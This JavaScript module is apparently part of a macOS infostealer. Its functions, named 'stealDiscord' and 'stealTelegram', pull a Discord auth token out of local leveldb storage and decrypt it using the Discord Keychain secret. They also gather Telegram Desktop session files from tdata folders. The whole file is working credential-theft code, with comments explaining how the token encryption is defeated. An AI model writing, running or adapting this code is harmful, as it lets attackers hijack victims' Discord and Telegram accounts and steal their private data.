'use strict';
/*
 * Messengers: Discord + Telegram.
 *
 * Discord (Electron/Chromium): the auth token lives in the Local Storage
 * leveldb (Local Storage/leveldb/*.ldb) under the `token` key. The stored value
 * is a base64-encoded os_crypt "v10" blob (`<prefix>:<base64(v10 ciphertext)>`),
 * not the plaintext token — we base64-decode it and decrypt it with the
 * "discord Safe Storage" Keychain secret (the same os_crypt scheme as Chrome)
 * to recover the classic 3-segment token.
 *
 * Telegram Desktop: the session lives in a `tdata` directory (preconfig*,
 * key_datas, session*.tdb). We search the standard locations plus any sandbox
 * container and capture the session files.
 *
 * No native deps — raw byte scans + file reads + the existing decryptor.
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const { keychainGet } = require('./keychain');

const HOME = os.homedir();
const APP_SUPPORT = path.join(HOME, 'Library', 'Application Support');
const CONTAINERS = path.join(HOME, 'Library', 'Containers');

function readAll(dir) {
  const out = [];
  let entries;
  try { entries = fs.readdirSync(dir); } catch (e) { return out; }
  for (const f of entries) {
    if (!f.endsWith('.ldb')) continue;
    try { out.push(fs.readFileSync(path.join(dir, f))); } catch (e) {}
  }
  return out;
}

// The value stored under Discord's standalone `token` key is NOT the plaintext
// token — it is a base64-encoded os_crypt "v10" blob: `<prefix>:<base64(v10
// ciphertext)>`. We locate the standalone `token` key (a `token` not part of a
// longer word like tokenStatus / access_token) and pull that base64 value.
function extractTokenValues(buffers) {
  const values = new Set();
  for (const buf of buffers) {
    const text = buf.toString('utf8');
    let idx = 0;
    while (true) {
      idx = text.indexOf('token', idx);
      if (idx === -1) break;
      const before = idx > 0 ? text[idx - 1] : '';
      const after = text[idx + 5] || '';
      // Standalone key: not part of a longer identifier (tokenStatus, etc.).
      if (!/[a-zA-Z_]/.test(before) && !/[a-zA-Z_]/.test(after)) {
        // Value starts after the leveldb framing bytes; grab the base64 run
        // (it may contain a colon separating the prefix from the payload).
        let j = idx + 5;
        while (j < text.length && !/[A-Za-z0-9]/.test(text[j])) j++;
        let val = '';
        while (j < text.length && /[A-Za-z0-9+/=:_-]/.test(text[j])) { val += text[j]; j++; }
        if (val.length >= 40) values.add(val);
      }
      idx += 5;
    }
  }
  return [...values];
}

// Decrypt a stored token value into the real (classic 3-segment) Discord token.
// The value is `<prefix>:<base64(v10 os_crypt blob)>`; base64-decoding the part
// after the colon yields a `v10`-prefixed blob that the os_crypt decryptor
// (keyed by the "discord Safe Storage" Keychain secret) turns into the token.
function decryptTokenValue(value, decrypt) {
  if (!decrypt) return null;
  const b64 = value.includes(':') ? value.split(':').slice(1).join(':') : value;
  let blob;
  try { blob = Buffer.from(b64, 'base64'); } catch (e) { return null; }
  if (blob.length < 20 || blob.slice(0, 3).toString() !== 'v10') return null;
  return decrypt(blob) || null;
}

function stealDiscord(makeDecryptor) {
  const result = { dir: null, keychain_secret: null, token_values: [], tokens: [] };
  const base = path.join(APP_SUPPORT, 'discord');
  if (!fs.existsSync(base)) return result;
  result.dir = base;
  // The item's account is "discord Key" (varies by build), so look up by
  // service only.
  result.keychain_secret = keychainGet('discord Safe Storage');
  const decrypt = makeDecryptor(result.keychain_secret);

  // Gather leveldb files from the base dir and any versioned subdirs.
  const buffers = readAll(path.join(base, 'Local Storage', 'leveldb'));
  let subEntries = [];
  try { subEntries = fs.readdirSync(base, { withFileTypes: true }); } catch (e) {}
  for (const ent of subEntries) {
    if (!ent.isDirectory()) continue;
    buffers.push(...readAll(path.join(base, ent.name, 'Local Storage', 'leveldb')));
  }

  // The stored `token` values are base64 v10 os_crypt blobs; decrypt each into
  // the real token. Keep the raw stored values too, for reference.
  const tokenValues = extractTokenValues(buffers);
  result.token_values = tokenValues;
  result.tokens = tokenValues.map((v) => decryptTokenValue(v, decrypt)).filter(Boolean);
  return result;
}

// Telegram tdata search locations.
const TELEGRAM_BASES = [
  path.join(HOME, 'Library', 'Telegram Desktop'),
  path.join(CONTAINERS, 'com.telegram.messenger', 'Data', 'Documents'),
  path.join(CONTAINERS, 'ru.keepcoder.Telegram', 'Data', 'Documents'),
];

function findTdata(bases) {
  const found = [];
  for (const base of bases) {
    if (!fs.existsSync(base)) continue;
    // Direct tdata under base, or anywhere within 5 levels.
    const stack = [base];
    const seen = new Set();
    let depth = 0;
    while (stack.length && depth < 5000) {
      const dir = stack.shift();
      if (seen.has(dir)) continue;
      seen.add(dir);
      let entries;
      try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch (e) { continue; }
      for (const ent of entries) {
        const p = path.join(dir, ent.name);
        if (ent.isDirectory()) {
          if (ent.name === 'tdata') {
            found.push(p);
          } else {
            stack.push(p);
          }
        } else if (/^(preconfig|key_datas|session|enc|map|tmp|keys)/i.test(ent.name)) {
          found.push(p);
        }
      }
      depth++;
    }
  }
  return [...new Set(found)];
}

// A Telegram DC (data center) id: the tdata dir holds one auth file per DC the
// account is connected to, named `dc1`..`dc5`. The DC id is the number.
const DC_FILE_RE = /^dc(\d+)$/i;

function stealTelegram() {
  const result = { locations: [], session_files: [], dc_ids: [], found: false };
  for (const base of TELEGRAM_BASES) {
    if (fs.existsSync(base)) result.locations.push(base);
  }
  const tdata = findTdata(TELEGRAM_BASES);
  for (const dir of tdata) {
    let files = [];
    try { files = fs.readdirSync(dir); } catch (e) { continue; }
    // DC ids: dc1..dcN auth files (the data centers this session uses).
    for (const f of files) {
      const m = f.match(DC_FILE_RE);
      if (m && !result.dc_ids.includes(Number(m[1]))) result.dc_ids.push(Number(m[1]));
    }
    const sessionFiles = files.filter((f) =>
      /^(preconfig|key_datas|session|enc|map|keys|dc\d+)$/i.test(f) || f.endsWith('.tdb')
    );
    if (sessionFiles.length) {
      result.session_files.push({ dir, files: sessionFiles });
      result.found = true;
    } else if (dir.endsWith('tdata')) {
      result.session_files.push({ dir, files: files.slice(0, 100) });
      result.found = true;
    }
  }
  result.dc_ids.sort((a, b) => a - b);
  return result;
}

function stealMessengers(makeDecryptor) {
  return {
    discord: stealDiscord(makeDecryptor),
    telegram: stealTelegram(),
  };
}

module.exports = { stealMessengers };
